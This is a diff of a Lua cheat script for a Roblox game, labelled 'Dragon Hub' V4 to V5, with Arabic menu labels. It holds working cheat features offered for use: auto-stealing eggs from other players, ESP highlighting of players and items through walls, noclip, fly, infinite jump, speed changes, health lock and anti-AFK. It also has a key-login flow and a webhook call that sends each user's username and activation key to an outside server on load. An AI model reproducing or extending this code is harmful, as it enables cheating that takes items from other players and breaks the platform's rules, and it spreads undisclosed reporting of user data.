-    Tog(PSteal, "تشغيل السرقة التلقائية", Config.AutoSteal, function(v)
+    Tog(PSteal, "🥚 السرقة التلقائية", Config.AutoSteal, function(v)
         Config.AutoSteal = v
         Notify("Auto Steal", v and "✓ مفعّل" or "معطّل")
     end)
-    Tog(PSteal, "⏱️ تأخير ذكي (Anti-Spam)", Config.SmartDelay, function(v) Config.SmartDelay = v end)
+    Tog(PSteal, "⏱️ تأخير ذكي", Config.SmartDelay, function(v) Config.SmartDelay = v end)
     Tog(PSteal, "🎯 سرقة كل البيض", Config.StealAll, function(v) Config.StealAll = v end)
     Tog(PSteal, "💎 البيض النادر فقط", Config.StealOnlyRare, function(v) Config.StealOnlyRare = v end)
     Tog(PSteal, "🏠 العودة للقاعدة", Config.TeleportOnSteal, function(v) Config.TeleportOnSteal = v end)
-    Sld(PSteal, "تأخير السرقة (ms/10)", 10, 30, Config.StealDelay * 10, function(v)
-        Config.StealDelay = v / 10
-    end)
-    Sld(PSteal, "أقصى مدى", 50, 2000, Config.StealRange, function(v) Config.StealRange = v end)
 
     -- HATCH
     Sec(PHatch, "🐣 الفتح التلقائي")
     Tog(PHatch, "تشغيل الفتح التلقائي", Config.AutoHatch, function(v) Config.AutoHatch = v end)
-    Sld(PHatch, "تأخير الفتح (ms/10)", 5, 60, Config.HatchDelay * 10, function(v) Config.HatchDelay = v / 10 end)
     Tog(PHatch, "🛒 شراء البيض", Config.AutoBuyEgg, function(v) Config.AutoBuyEgg = v end)
     Btn(PHatch, "🥚 فتح كل البيض الآن", function()
         local list = {"HatchEgg","hatchEgg","EggHatch","OpenEgg","hatch","Hatch","HatchAll"}
@@ -1203,13 +1195,9 @@ function BuildHub()
 
     -- CHAR
     Sec(PChar, "👤 الحركة")
-    Sld(PChar, "سرعة المشي", 16, 300, Config.WalkSpeed, function(v) Config.WalkSpeed = v end)
-    Sld(PChar, "قوة القفز", 50, 300, Config.JumpPower, function(v) Config.JumpPower = v end)
-    Sec(PChar, "🛡️ الحماية")
-    Tog(PChar, "مضاد التجمد", Config.AntiStun, function(v) Config.AntiStun = v end)
-    Tog(PChar, "قفز لا نهائي", Config.InfiniteJump, function(v) Config.InfiniteJump = v end)
+    Tog(PChar, "🚀 سرعة معتدلة (32)", false, function(v) Config.WalkSpeed = v and 32 or 16 end)
+    Tog(PChar, "🦘 قفز لا نهائي", Config.InfiniteJump, function(v) Config.InfiniteJump = v end)
     Tog(PChar, "🚪 Noclip", Config.Noclip, function(v) Config.Noclip = v end)
-    Sec(PChar, "🛠️ أدوات")
     Btn(PChar, "💀 إعادة إنعاش", function()
         if LocalPlayer.Character then LocalPlayer.Character:BreakJoints() end
     end)
@@ -1220,7 +1208,7 @@ function BuildHub()
         Config.EggESP = v
         if not v then
             for _, o in ipairs(Workspace:GetDescendants()) do
-                if o:IsA("Highlight") and o.Name == "DH4_Egg" then o:Destroy() end
+                if o:IsA("Highlight") and o.Name == "DH5_Egg" then o:Destroy() end
             end
         end
     end)
@@ -1228,7 +1216,7 @@ function BuildHub()
         Config.PlayerESP = v
         if not v then
             for _, o in ipairs(Workspace:GetDescendants()) do
-                if o:IsA("Highlight") and o.Name == "DH4_Player" then o:Destroy() end
+                if o:IsA("Highlight") and o.Name == "DH5_Player" then o:Destroy() end
             end
         end
     end)
@@ -1236,7 +1224,7 @@ function BuildHub()
         Config.CoinESP = v
         if not v then
             for _, o in ipairs(Workspace:GetDescendants()) do
-                if o:IsA("Highlight") and o.Name == "DH4_Coin" then o:Destroy() end
+                if o:IsA("Highlight") and o.Name == "DH5_Coin" then o:Destroy() end
             end
         end
     end)
@@ -1288,14 +1276,11 @@ function BuildHub()
             Notify("Fly", "معطّل")
         end
     end)
-    Sld(PFly, "سرعة الطيران", 20, 300, Config.FlySpeed, function(v) Config.FlySpeed = v end)
 
     -- MISC
     Sec(PMisc, "⚙️ متفرقات")
     Tog(PMisc, "🛡️ Anti-AFK", Config.AntiAFK, function(v) Config.AntiAFK = v end)
-    Tog(PMisc, "🎲 Anti-AFK عشوائي", Config.AntiAFKRandom, function(v) Config.AntiAFKRandom = v end)
     Tog(PMisc, "💰 جمع العملات", Config.AutoCollectCoins, function(v) Config.AutoCollectCoins = v end)
-    Sec(PMisc, "🔄 السيرفر")
     Btn(PMisc, "🔄 إعادة الاتصال", function()
         Notify("Rejoin", "جاري...")
         task.wait(1)
@@ -1382,28 +1367,39 @@ function BuildHub()
         end
     end)
 
-    -- OPEN / CLOSE
+    -- OPEN/CLOSE AURA
     local isOpen = false
     local origSize = UDim2.new(0, 440, 0, 520)
     local function OpenUI()
         isOpen = true
         Main.Visible = true
-        Main.Size = UDim2.new(0, 100, 0, 100)
-        TweenService:Create(Main, TweenInfo.new(0.28, Enum.EasingStyle.Back), {
-            Size = origSize
+        Main.Size = UDim2.new(0, 0, 0, 0)
+        Main.Position = FB.Position
+        Main.Rotation = 90
+        TweenService:Create(Main, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+            Size = origSize,
+            Position = UDim2.new(0.5, -220, 0.5, -260),
+            Rotation = 0
         }):Play()
+        TweenService:Create(FB, TweenInfo.new(0.2), {Size = UDim2.new(0, 0, 0, 0)}):Play()
+        task.wait(0.2)
         FB.Visible = false
     end
     local function CloseUI()
         isOpen = false
-        TweenService:Create(Main, TweenInfo.new(0.2), {Size = UDim2.new(0, 0, 0, 0)}):Play()
-        task.wait(0.2)
+        TweenService:Create(Main, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+            Size = UDim2.new(0, 0, 0, 0),
+            Position = FB.Position,
+            Rotation = -90
+        }):Play()
+        task.wait(0.25)
         Main.Visible = false
         FB.Visible = true
+        TweenService:Create(FB, TweenInfo.new(0.3, Enum.EasingStyle.Back), {Size = UDim2.new(0, 70, 0, 70)}):Play()
     end
     FB.MouseButton1Click:Connect(function()
-        if fbD then return end
-        OpenUI()
+        if moved then return end
+        if not isOpen then OpenUI() end
     end)
     ClsB.MouseButton1Click:Connect(CloseUI)
     MinB.MouseButton1Click:Connect(function()
@@ -1474,7 +1470,7 @@ function BuildHub()
         end
     end)
 
-    -- HEALTH LOCK
+    -- HEALTH LOCK + ANTI TOUCH + ANTI FLING + ANTI VOID
     task.spawn(function()
         while task.wait(0.15) do
             if not Config.HealthLock then continue end
@@ -1488,30 +1484,17 @@ function BuildHub()
         end
     end)
 
-    -- AUTO HEAL
-    task.spawn(function()
-        while task.wait(0.5) do
-            if not Config.AutoHeal then continue end
-            local c = LocalPlayer.Character
-            if not c then continue end
-            local h = c:FindFirstChildOfClass("Humanoid")
-            if h and h.Health < h.MaxHealth then h.Health = h.MaxHealth end
-        end
-    end)
-
-    -- ANTI TOUCH
     task.spawn(function()
         while task.wait(0.3) do
             if not Config.AntiTouch then continue end
             local c = LocalPlayer.Character
             if not c then continue end
-            for _, part in ipairs(c:GetDescendants()) do
-                if part:IsA("BasePart") then part.CanTouch = false end
+            for _, p in ipairs(c:GetDescendants()) do
+                if p:IsA("BasePart") then p.CanTouch = false end
             end
         end
     end)
 
-    -- ANTI FLING
     task.spawn(function()
         while task.wait(0.1) do
             if not Config.AntiFling then continue end
@@ -1526,7 +1509,6 @@ function BuildHub()
         end
     end)
 
-    -- ANTI VOID
     RunService.Heartbeat:Connect(function()
         if not Config.AntiVoid then return end
         local c = LocalPlayer.Character
@@ -1535,24 +1517,6 @@ function BuildHub()
         if hrp and hrp.Position.Y < -100 then
             hrp.CFrame = CFrame.new(0, 50, 0)
             Notify("Anti-Void", "تم إنقاذك!", 2, Color3.fromRGB(100, 200, 255))
-        end
-    end)
-
-    -- EMERGENCY TP
-    task.spawn(function()
-        while task.wait(0.2) do
-            if not Config.EmergencyTP then continue end
-            local c = LocalPlayer.Character
-            if not c then continue end
-            local h = c:FindFirstChildOfClass("Humanoid")
-            local hrp = c:FindFirstChild("HumanoidRootPart")
-            if not h or not hrp then continue end
-            if h.Health <= Config.EmergencyHealth and h.Health > 0 then
-                hrp.CFrame = CFrame.new(hrp.Position.X, 500, hrp.Position.Z)
-                hrp.Velocity = Vector3.zero
-                h.Health = h.MaxHealth
-                Notify("🚨 Emergency", "تم إنقاذك!", 2, Color3.fromRGB(255, 200, 60))
-            end
         end
     end)
 
@@ -1655,16 +1619,16 @@ function BuildHub()
         while task.wait(0.5) do
             if not Config.EggESP then
                 for _, o in ipairs(Workspace:GetDescendants()) do
-                    if o:IsA("Highlight") and o.Name == "DH4_Egg" then o:Destroy() end
+                    if o:IsA("Highlight") and o.Name == "DH5_Egg" then o:Destroy() end
                 end
             else
                 for _, o in ipairs(Workspace:GetDescendants()) do
                     if o:IsA("BasePart") and o.Parent ~= LocalPlayer.Character then
                         local nm = o.Name:lower()
                         if nm:find("egg") or nm:find("drop") then
-                            if not o:FindFirstChild("DH4_Egg") then
+                            if not o:FindFirstChild("DH5_Egg") then
                                 local h = Instance.new("Highlight", o)
-                                h.Name = "DH4_Egg"
+                                h.Name = "DH5_Egg"
                                 h.FillColor = Config.EggESPColor
                                 h.OutlineColor = Color3.fromRGB(255,255,255)
                                 h.FillTransparency = 0.5
@@ -1676,14 +1640,14 @@ function BuildHub()
             end
             if not Config.PlayerESP then
                 for _, o in ipairs(Workspace:GetDescendants()) do
-                    if o:IsA("Highlight") and o.Name == "DH4_Player" then o:Destroy() end
+                    if o:IsA("Highlight") and o.Name == "DH5_Player" then o:Destroy() end
                 end
             else
                 for _, p in ipairs(Players:GetPlayers()) do
                     if p ~= LocalPlayer and p.Character then
-                        if not p.Character:FindFirstChild("DH4_Player") then
+                        if not p.Character:FindFirstChild("DH5_Player") then
                             local h = Instance.new("Highlight", p.Character)
-                            h.Name = "DH4_Player"
+                            h.Name = "DH5_Player"
                             h.FillColor = Config.PlayerESPColor
                             h.OutlineColor = Color3.fromRGB(255,255,255)
                             h.FillTransparency = 0.55
@@ -1694,16 +1658,16 @@ function BuildHub()
             end
             if not Config.CoinESP then
                 for _, o in ipairs(Workspace:GetDescendants()) do
-                    if o:IsA("Highlight") and o.Name == "DH4_Coin" then o:Destroy() end
+                    if o:IsA("Highlight") and o.Name == "DH5_Coin" then o:Destroy() end
                 end
             else
                 for _, o in ipairs(Workspace:GetDescendants()) do
                     if o:IsA("BasePart") and o.Parent ~= LocalPlayer.Character then
                         local nm = o.Name:lower()
                         if nm:find("coin") or nm:find("cash") then
-                            if not o:FindFirstChild("DH4_Coin") then
+                            if not o:FindFirstChild("DH5_Coin") then
                                 local h = Instance.new("Highlight", o)
-                                h.Name = "DH4_Coin"
+                                h.Name = "DH5_Coin"
                                 h.FillColor = Config.CoinESPColor
                                 h.OutlineColor = Color3.fromRGB(255,255,255)
                                 h.FillTransparency = 0.5
@@ -1727,9 +1691,9 @@ function BuildHub()
     end)
 
     task.wait(0.3)
-    Notify("Dragon Hub V4", "✓ GODMODE Loaded!", 4)
+    Notify("Dragon Hub V5", "✓ Aura Loaded!", 4)
     Notify("🛡️ Guardian", "8 Layers Protection Active", 5, Color3.fromRGB(100, 255, 150))
-    SendWebhook("🐉 **Dragon Hub V4 GODMODE Loaded**\nUser: `" .. LocalPlayer.Name .. "`\nKey: `" .. tostring(Config.ActiveKey) .. "`")
+    SendWebhook("🐉 **Dragon Hub V5 Aura Loaded**\nUser: `" .. LocalPlayer.Name .. "`\nKey: `" .. tostring(Config.ActiveKey) .. "`")
 
     task.spawn(function()
         while task.wait(60) do SaveConfig() end
@@ -1737,10 +1701,10 @@ function BuildHub()
 end
 
 -- ═════════════════════════════════════════════════════════════════════════════
--- [14] START
+-- [14] START — Auto-Login مع المفتاح المحفوظ
 -- ═════════════════════════════════════════════════════════════════════════════
 
-local function ShowKeyUI()
+local function ShowKeyUIAndWait()
     local KF, KB, SB, SL = CreateKeyUI()
     local function Submit()
         local input = KB.Text
@@ -1790,10 +1754,10 @@ if sk and se and se > os.time() then
             BuildHub()
         else
             ClearKeyFile()
-            ShowKeyUI()
+            ShowKeyUIAndWait()
         end
     end)
 else
     ClearKeyFile()
-    ShowKeyUI()
+    ShowKeyUIAndWait()
 end
